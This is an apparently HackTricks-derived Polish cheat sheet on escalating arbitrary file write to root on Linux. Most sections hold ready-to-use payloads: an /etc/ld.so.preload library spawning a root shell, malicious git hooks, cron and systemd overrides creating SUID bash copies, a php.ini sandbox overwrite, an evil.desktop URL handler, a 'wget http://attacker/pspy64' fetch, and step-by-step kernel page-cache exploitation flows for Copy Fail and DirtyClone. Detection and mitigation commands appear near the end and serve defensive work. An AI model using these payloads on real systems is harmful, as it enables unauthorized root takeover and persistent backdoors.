# Dowolny zapis pliku do Roota

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

Ten plik działa jak zmienna środowiskowa **`LD_PRELOAD`**, ale działa również w **binariach SUID**.\
Jeśli możesz go utworzyć lub zmodyfikować, możesz po prostu dodać **ścieżkę do biblioteki, która zostanie załadowana** przy każdym wykonaniu binarium.

Na przykład: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) to **skrypty**, które są **uruchamiane** podczas różnych **zdarzeń** w repozytorium git, takich jak utworzenie commit, merge... Jeśli więc **uprzywilejowany skrypt lub użytkownik** często wykonuje te czynności i możliwe jest **zapisywanie w folderze `.git`**, można to wykorzystać do **privesc**.

Na przykład można **wygenerować skrypt** w repozytorium git w **`.git/hooks`**, aby był zawsze wykonywany po utworzeniu nowego commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
chmod +x pre-commit
```
### Pliki Cron i pliki czasowe

Jeśli możesz **zapisywać pliki związane z Cronem, które są wykonywane przez root**, zazwyczaj możesz uzyskać wykonanie kodu przy następnym uruchomieniu zadania. Interesujące cele obejmują:

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Własny crontab roota w `/var/spool/cron/` lub `/var/spool/cron/crontabs/`
- Timery `systemd` i usługi, które uruchamiają

Szybkie sprawdzenia:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Typowe ścieżki nadużyć:

- **Dodanie nowego zadania root cron** do `/etc/crontab` lub pliku w `/etc/cron.d/`
- **Zastąpienie skryptu** już wykonywanego przez `run-parts`
- **Dodanie backdoora do istniejącego celu timera** poprzez modyfikację uruchamianego przez niego skryptu lub pliku binarnego

Minimalny przykład payloadu cron:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Jeśli możesz zapisywać wyłącznie w katalogu cron używanym przez `run-parts`, umieść tam zamiast tego plik wykonywalny:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Notatki:

- `run-parts` zazwyczaj pomija nazwy plików zawierające kropki, dlatego preferuj nazwy takie jak `backup` zamiast `backup.sh`.
- Niektóre dystrybucje używają `anacron` lub timerów `systemd` zamiast klasycznego `cron`, ale idea abuse jest taka sama: **zmodyfikuj to, co root wykona później**.

### Pliki Service i Socket

Jeśli możesz zapisywać **pliki unit `systemd`** lub pliki, do których się odwołują, możesz uzyskać code execution jako root, przeładowując i restartując unit albo czekając, aż ścieżka aktywacji service/socket zostanie uruchomiona.

Interesujące cele obejmują:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Nadpisania drop-in w `/etc/systemd/system/<unit>.d/*.conf`
- Skrypty/binaria service wskazywane przez `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Zapisywalne ścieżki `EnvironmentFile=`, ładowane przez service uruchamiany jako root

Szybkie sprawdzenia:
```bash
ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system 2>/dev/null
```
Typowe ścieżki nadużyć:

- **Nadpisanie `ExecStart=`** w należącym do roota unit service, który możesz modyfikować
- **Dodanie drop-in override** z malicious `ExecStart=` i wcześniejsze wyczyszczenie starej wartości
- **Dodanie backdoora do skryptu/binarnego pliku**, do którego unit już się odwołuje
- **Przejęcie socket-activated service** przez modyfikację odpowiedniego pliku `.service`, który jest uruchamiany po odebraniu połączenia przez socket

Przykładowy malicious override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Typowy przebieg aktywacji:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Jeśli nie możesz samodzielnie zrestartować services, ale możesz edytować unit aktywowany przez socket, być może wystarczy **poczekać na połączenie klienta**, aby uruchomić backdoored service jako root.

### Nadpisanie restrykcyjnego `php.ini` używanego przez uprzywilejowany sandbox PHP

Niektóre niestandardowe daemony weryfikują kod PHP dostarczony przez użytkownika, uruchamiając `php` z **restrykcyjnym `php.ini`** (na przykład `disable_functions=exec,system,...`). Jeśli kod uruchamiany w sandboxie nadal ma **dowolną możliwość zapisu** (np. `file_put_contents`) i możesz uzyskać dostęp do **dokładnej ścieżki `php.ini`** używanej przez daemon, możesz **nadpisać tę konfigurację**, aby znieść ograniczenia, a następnie przesłać drugi payload, który wykona się z podwyższonymi uprawnieniami.

Typowy przebieg:

1. Pierwszy payload nadpisuje konfigurację sandboxa.
2. Drugi payload wykonuje kod, ponieważ niebezpieczne funkcje są teraz ponownie włączone.

Minimalny przykład (zastąp ścieżkę używaną przez daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Jeśli daemon działa jako root (lub weryfikuje ścieżki należące do root), drugie wykonanie uzyskuje kontekst root. Jest to zasadniczo **privilege escalation via config overwrite**, gdy sandboxed runtime nadal może zapisywać pliki.

### binfmt_misc

Plik znajdujący się w `/proc/sys/fs/binfmt_misc` wskazuje, który plik binarny powinien wykonywać jakie typy plików. TODO: sprawdzić wymagania niezbędne do abuse tej funkcji w celu wykonania rev shell po otwarciu często używanego typu pliku.

### Overwrite schema handlers (like http: or https:)

Atakujący z uprawnieniami do zapisu w katalogach konfiguracyjnych ofiary może łatwo zastąpić lub utworzyć pliki zmieniające zachowanie systemu, co prowadzi do niezamierzonego code execution. Modyfikując plik `$HOME/.config/mimeapps.list`, aby wskazywał HTTP i HTTPS URL handlers na złośliwy plik (np. ustawiając `x-scheme-handler/http=evil.desktop`), atakujący zapewnia, że **kliknięcie dowolnego linku http lub https uruchomi kod określony w tym pliku `evil.desktop`**. Na przykład po umieszczeniu poniższego złośliwego kodu w pliku `evil.desktop` w `$HOME/.local/share/applications`, każde kliknięcie zewnętrznego URL uruchamia osadzone polecenie:
```bash
[Desktop Entry]
Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
Type=Application
Name=Evil Desktop Entry
```
Więcej informacji znajdziesz w [**tym poście**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), w którym wykorzystano realną lukę.

### Root wykonujący skrypty/binaria zapisywalne przez użytkownika

Jeśli uprzywilejowany workflow uruchamia coś takiego jak `/bin/sh /home/username/.../script` (lub dowolny plik binarny wewnątrz katalogu należącego do nieuprzywilejowanego użytkownika), możesz to przejąć:

- **Wykryj wykonanie:** monitoruj procesy za pomocą [pspy](https://github.com/DominicBreuker/pspy), aby wykryć, kiedy root uruchamia ścieżki kontrolowane przez użytkownika:
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Potwierdź możliwość zapisu:** upewnij się, że zarówno plik docelowy, jak i jego katalog są własnością Twojego użytkownika lub są przez niego zapisywalne.
- **Przejmij plik docelowy:** wykonaj kopię zapasową oryginalnego pliku binary/skryptu i umieść payload tworzący SUID shell (lub wykonujący inne działanie jako root), a następnie przywróć uprawnienia:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Uruchom uprzywilejowane działanie** (np. naciśnij przycisk UI, który uruchamia helpera). Gdy root ponownie wykona przejętą ścieżkę, uzyskaj eskalowaną powłokę za pomocą `./rootshell -p`.

### Modyfikacja uprzywilejowanych plików binarnych wyłącznie w page cache

Niektóre błędy kernela nie modyfikują pliku **na dysku**. Zamiast tego umożliwiają modyfikację wyłącznie **kopii w page cache** odczytywalnego pliku. Jeśli można zaatakować plik binarny **setuid** lub inny plik **wykonywany przez root**, następne wykonanie może uruchomić kontrolowane przez atakującego bajty z pamięci i doprowadzić do eskalacji uprawnień, mimo że hash pliku na dysku się nie zmienił.

Warto postrzegać to jako **prymityw zapisu do pliku działający wyłącznie w czasie działania**:

- **Dysk pozostaje czysty**: inode i bajty zapisane na dysku nie zmieniają się
- **Pamięć jest zmodyfikowana**: procesy odczytujące lub wykonujące zawartość zbuforowanej strony otrzymują treść zmodyfikowaną przez atakującego
- **Efekt jest tymczasowy**: zmiana znika po restarcie lub usunięciu strony z cache

Ten prymityw plasuje się pomiędzy klasycznym **arbitrary file write** a starszymi błędami wykorzystującymi page cache, takimi jak Dirty COW / Dirty Pipe:

- Dirty COW opierał się na race condition
- Dirty Pipe miał ograniczenia dotyczące pozycji zapisu
- Prymityw działający wyłącznie w page cache może być bardziej niezawodny, jeśli podatna ścieżka zapewnia bezpośredni zapis do buforowanych stron odwzorowanych z pliku

#### Generic privesc flow

1. Uzyskaj kernel primitive umożliwiający zapis do **stron page cache odwzorowanych z pliku**
2. Użyj go przeciwko **odczytywalnemu uprzywilejowanemu plikowi binarnemu** lub innemu plikowi wykonywanemu przez root
3. Uruchom wykonanie **zanim** strona zostanie usunięta z cache
4. Uzyskaj code execution jako root, podczas gdy plik na dysku nadal wygląda na niezmodyfikowany

Typowe cele o wysokiej wartości:

- Pliki binarne **setuid-root**
- Helpery uruchamiane przez **usługi root**
- Pliki binarne często wykonywane z **kontenerów współdzielących kernel/page cache hosta**

#### Przykładowa ścieżka AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) jest dobrym przykładem tej klasy. Podatna ścieżka znajdowała się w userspace API kryptografii Linuxa (`AF_ALG` / `algif_aead`):

- `splice()` może przenosić referencje do stron page cache z odczytywalnego pliku do scatterlisty TX kryptografii
- ścieżka deszyfrowania `algif_aead` in-place ponownie wykorzystywała bufory źródłowe i docelowe
- `authencesn` zapisywał następnie do regionu tagu docelowego
- gdy ten region nadal odwoływał się do stron odwzorowanych z pliku, zapis trafiał do **page cache docelowego pliku**

Interesująca technika nie polega więc na samym CVE, lecz na następującym wzorcu:

- **przekaż strony cache odwzorowane z pliku do subsystemu kernela**
- spraw, aby subsystem **potraktował je jako zapisywalne dane wyjściowe**
- wywołaj niewielkie, kontrolowane nadpisanie w pamięci

Publiczny PoC używał powtarzanych **zapisów 4-bajtowych**, aby zmodyfikować `/usr/bin/su` w pamięci, a następnie go wykonać.

#### Przykładowa ścieżka ESP / XFRM + klonowanie netfilter TEE

DirtyClone (CVE-2026-43503) pokazuje inną odmianę tego samego wzorca **zapisu do root wyłącznie w page cache**, jednak tym razem celem jest **deszyfrowanie IPsec ESP**, a nie `AF_ALG`.

Najważniejszą techniką jest etap **metadata-laundering**:

- `splice()` umieszcza **tylko do odczytu stronę page cache odwzorowaną z pliku** w pakiecie ESP-in-UDP
- pierwotne zabezpieczenie DirtyFrag oznaczało ten skb flagą `SKBFL_SHARED_FRAG`, aby `esp_input()` wykonał **kopiowanie przed deszyfrowaniem**
- netfilter `TEE` duplikuje pakiet przez `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- klon zachowuje **tę samą fizyczną referencję do strony page cache**, ale traci `SKBFL_SHARED_FRAG`
- `esp_input()` traktuje więc klon jako bezpieczny i wykonuje deszyfrowanie `cbc(aes)` **in-place** na stronie odwzorowanej z pliku

Wniosek dla reviewera jest szerszy niż samo CVE: jeśli zabezpieczenie opiera się na **metadanych skb/page** przy podejmowaniu decyzji, czy operacja musi najpierw wykonać kopię, każda **ścieżka klonowania/kopiowania, która zachowuje stronę bazową, ale usuwa metadane**, może niejawnie ponownie otworzyć prymityw zapisu.

Typowy flow exploitation:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`, aby uzyskać **`CAP_NET_ADMIN` wewnątrz prywatnego network namespace**
2. Włącz interfejs loopback i zainstaluj regułę **netfilter `TEE`** w `mangle/OUTPUT`
3. Zainstaluj transportowe SA XFRM ESP za pomocą `NETLINK_XFRM`
4. Zakoduj każde docelowe słowo 4-bajtowe w polu `seq_hi` SA (trick wyboru słowa z DirtyFrag)
5. Wyślij spliced pakiet ESP-in-UDP, aby **klon TEE** dotarł do `esp_input()` i wykonał deszyfrowanie **in-place**
6. Powtarzaj operację, aż kopia `/usr/bin/su` w page cache lub innego uprzywilejowanego pliku wykonywalnego będzie zawierać kod kontrolowany przez atakującego

Z punktu widzenia działania wpływ jest taki sam jak w przykładzie `AF_ALG`: plik na dysku pozostaje czysty, ale `execve()` używa **zmodyfikowanych bajtów page cache** i zapewnia root.

Przydatne testy sprawdzające ekspozycję na tę odmianę:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Krótkoterminowe ograniczenie powierzchni ataku jest tutaj również zależne od ścieżki: aktualizacja do kernela zawierającego `48f6a5356a33` naprawia ścieżkę `clone`, natomiast zablokowanie automatycznego ładowania `xt_TEE` usuwa **krok przemycania flagi**, a zablokowanie `esp4` / `esp6` usuwa **sink deszyfrowania**.

#### Wykrywanie i wyszukiwanie

Jeśli podejrzewasz tę klasę błędów, nie polegaj wyłącznie na kontrolach integralności plików na dysku. Sprawdź również:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` może być ładowany i wyładowywany jako moduł
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfejs jest wbudowany w kernel
- binaria setuid są dobrymi celami, ponieważ patch obejmujący wyłącznie page cache może wystarczyć do przekształcenia lokalnego footholdu w roota

#### Redukcja attack surface dla ścieżki `algif_aead`

Jeśli podatny interfejs jest dostarczany przez ładowalny moduł:
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Jeśli zostanie skompilowane w jądrze, w niektórych ujawnieniach zgłaszano blokowanie ścieżki init za pomocą:
```bash
initcall_blacklist=algif_aead_init
```
Ten rodzaj mitigacji warto pamiętać również w przypadku innych kernel LPE: jeśli exploitation zależy od konkretnego opcjonalnego interfejsu, wyłączenie lub umieszczenie tego interfejsu na blacklist może przerwać ścieżkę exploita, nawet zanim dostępna będzie pełna aktualizacja kernela.

## References

- [HTB Bamboo – przejęcie skryptu uruchamianego przez root w zapisywalnym przez użytkownika katalogu PaperCut](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [Ujawnienie CVE-2026-31431 przez Openwall oss-security](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [Fix w Linux stable: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [Copy Fail advisory](https://copy.fail/)
- [Techniczny writeup Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [Repozytorium / README DirtyClone](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [JFrog: analiza i exploitation wariantu Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [Linux fix: net: skb: zachowanie `SKBFL_SHARED_FRAG` w `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [Wcześniejsza mitigacja w Linux: ustawienie `SKBFL_SHARED_FRAG` dla splicowanych pakietów UDP (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)

{{#include ../../banners/hacktricks-training.md}}
